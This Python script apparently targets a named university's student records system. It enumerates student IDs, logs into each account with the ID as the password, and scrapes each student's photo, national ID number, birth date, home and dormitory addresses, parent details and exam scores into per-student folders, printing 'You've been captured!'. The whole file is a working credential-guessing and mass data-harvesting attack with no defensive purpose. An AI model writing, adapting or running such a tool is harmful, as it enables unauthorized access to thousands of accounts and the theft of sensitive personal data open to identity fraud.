#-*- coding:utf-8 -*-
__author__ = "Leo Luo"

import requests
from bs4 import BeautifulSoup
import collections
import lxml
import os
import sys
from PIL import Image

BASE_URP_URL = "http://bksjw.chd.edu.cn"
LOGIN_URL = "http://bksjw.chd.edu.cn/loginAction.do"
HEAD = {'User-Agent':'Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0','Connection': 'Keep-Alive'}
IMG_URL = "http://bksjw.chd.edu.cn/xjInfoAction.do?oper=img" #头像的URL
USER_INFO_URL = "http://bksjw.chd.edu.cn/xjInfoAction.do?oper=xjxx"
GRADE = "http://bksjw.chd.edu.cn/bxqcjcxAction.do"

class crawler(object):
    def __init__(self, username, user_info=None, session=None, img=None):
        self.username = username
        user_info = collections.OrderedDict()
        self.img = img
        self.__user_info = user_info
        self.session = requests.Session()

    @property
    def user_info(self):
        return self.__user_info

    @user_info.setter
    def user_info(self, value):
        self.__user_info = value

    def login(self):
        init_session = self.session.get(BASE_URP_URL, headers=HEAD)
        if init_session.status_code == 200:
            print("建立连接成功！")
        data = {'zjh':self.username,'mm':self.username,'dllx':'dldl'}
        index = self.session.post(LOGIN_URL,data=data, headers=HEAD)
        if index.status_code == 200:
            print("登陆成功")
        image = self.session.get(IMG_URL, headers=HEAD)
        global img_content
        """******Student's Photo***************"""
        img_content = image.content
        self.img = img_content
        """
        with open("test.png", "wb") as fh:
            fh.write(img_content)
        im = Image.open("test.png")
        im.show()
        """
        user_info_index = self.session.get(USER_INFO_URL,headers=HEAD)
        soup = user_info_index.text#content.decode('utf-8')
        return soup

    def get_content(self):
        raw_content = collections.OrderedDict()
        grade = self.session.get(GRADE, headers=HEAD)
        user_info = self.session.get(USER_INFO_URL, headers=HEAD)
        grade_content = grade.text
        user_info_content = user_info.text
        raw_content['grade'] = grade_content
        raw_content['user_info'] = user_info_content
        return raw_content

    def parse_user_info(self, user_info_content):
        soup = BeautifulSoup(user_info_content, 'lxml')
        id_num = soup.find_all('td', attrs={'width':'275'})
        user_info_list = []
        for i in id_num:
            user_info_list.append(i.string.strip())
        #print(user_info_list)
        #print(len(user_info_list))
        #user_info = collections.OrderedDict()
        try:
            self.user_info['学号：'] = user_info_list[0]
            self.user_info['姓名：'] = user_info_list[1]
            self.user_info['姓名拼音：'] = user_info_list[2]
            self.user_info['英文姓名：'] = user_info_list[3]
            self.user_info['曾用名：'] = user_info_list[4]
            self.user_info['身份证号：'] = user_info_list[5]
            self.user_info['性别：'] = user_info_list[6]
            self.user_info['学生类别：'] = user_info_list[7]
            self.user_info['特殊学生类型：'] = user_info_list[8]
            self.user_info['学籍状态：'] = user_info_list[9]
            self.user_info['收费类别：'] = user_info_list[10]
            self.user_info['民族：'] = user_info_list[11]
            self.user_info['籍贯：'] = user_info_list[12]
            self.user_info['出生日期：'] = user_info_list[13]
            self.user_info['政治面貌：'] = user_info_list[14]
            self.user_info['考区：'] = user_info_list[15]
            self.user_info['毕业中学：'] = user_info_list[16]
            self.user_info['高考总分：'] = user_info_list[17]
            self.user_info['录取号：'] = user_info_list[18]
            self.user_info['高考考生号：'] = user_info_list[19]
            self.user_info['入学语种考试：'] = user_info_list[20]
            self.user_info['通讯地址：'] = user_info_list[21]
            self.user_info['邮编：'] = user_info_list[22]
            self.user_info['家长信息：'] = user_info_list[23]
            self.user_info['入学日期：'] = user_info_list[24]
            self.user_info['系所：'] = user_info_list[25]
            self.user_info['专业：'] = user_info_list[26]
            self.user_info['专业方向：'] = user_info_list[27]
            self.user_info['年级：'] = user_info_list[28]
            self.user_info['班级：'] = user_info_list[29]
            self.user_info['是否有学籍：'] = user_info_list[30]
            self.user_info['是否有国家学籍：'] = user_info_list[31]
            self.user_info['校区：'] = user_info_list[32]
            self.user_info['异动否：'] = user_info_list[33]
            self.user_info['外语语种：'] = user_info_list[34]
            self.user_info['宿舍地址：'] = user_info_list[35]
            self.user_info['因材施教：'] = user_info_list[36]
            self.user_info['培养层次：'] = user_info_list[37]
            self.user_info['培养方式：'] = user_info_list[38]
            self.user_info['分流方向：'] = user_info_list[39]
            self.user_info['是否离校：'] = user_info_list[40]
            self.user_info['备注：'] = user_info_list[41]
            self.user_info['备注1：'] = user_info_list[42]
            self.user_info['备注2：'] = user_info_list[43]
            self.user_info['备注3：'] = user_info_list[44]
            #self.user_info['name'] = user_info_list[1]
        except IndexError as err:
            print("用户不存在!")
            return 0
        #print(len(user_info))
        """
        for key, value in self.user_info.items():
            print(key, value)
        """
        return 0
    def write_to_file(self):
        _class = self.username[0:10]
        student_id = self.username
        path = "F:\Students_New" + "\\" + _class + "\\" + student_id
        try:
            os.makedirs(path)
        except FileExistsError as err:
            pass
        os.chdir(path)
        with open("info.txt", "w") as fh:
            for key, value in self.user_info.items():
                content = key + value + "\n"
                fh.write(content)
        try:
            with open(self.user_info['姓名：'] + ".png", "wb") as fd:
                fd.write(self.img)
        except KeyError as err:
            return 0

"""
def mkdir(path):

    # 去除首位空格
    path=path.strip()
    # 去除尾部 \ 符号
    path=path.rstrip("\\")
    isExists=os.path.exists(path)
    # 判断结果
    if not isExists:
        # 如果不存在则创建目录
        print(path+' 创建成功')
        # 创建目录操作函数
        os.makedirs(path)
        return True
    else:
        # 如果目录存在则不创建，并提示目录已存在
        print path+' 目录已存在'
        return False
"""
def generate_username():
    sum = ""
    for year in range(2011,2016):
        if len(sum) != 0:
            sum = ""
        year = str(year)
        sum = year
        for i in range(1000,9999):
            if len(sum) != 4:
                sum = sum[0:4]
            i = str(i)
            sum += i
            for j in range(1,10):
                if len(sum) != 8:
                    sum = sum[0:8]
                j = str(j)
                sum = sum + "0" + j
                for id in range(1,40):
                    if len(sum) != 10:
                        sum = sum[0:10]
                    if id < 10:
                        id = "0" + str(id)
                    else:
                        id = str(id)
                    sum += id
                    yield sum

def main():
    a = generate_username()
    """
    print(next(a))
    print(next(a))
    print(next(a))
    print(next(a))
    print(next(a))
    print(next(a))
    print(next(a))
    """
    while True:
        username = next(a)
        username = str(username)
        c = crawler(username)
        soup = c.login()
        c.parse_user_info(soup)
        try:
            print("Hello, {0}. You've been captured! ".format(c.user_info['姓名：']))
        except KeyError as err:
            pass
        c.write_to_file()



if __name__ == "__main__":
    main()
